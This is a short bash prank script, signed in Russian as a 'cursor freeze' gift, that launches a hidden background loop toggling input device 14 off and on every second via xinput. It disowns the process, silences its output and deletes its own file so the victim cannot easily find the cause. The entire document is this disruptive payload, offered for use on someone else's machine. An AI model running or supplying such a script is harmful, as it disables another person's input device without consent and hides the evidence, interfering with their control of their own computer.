#!/bin/bash
# Зависание курсора 🥰💀 P.S. С любовью, Bauka (basagitz)
nohup bash -c "
    while true; do
        xinput --disable 14;
        sleep 1;
        xinput --enable 14;
        sleep 1
    done
" > /dev/null 2>&1 & disown
rm -- "$0"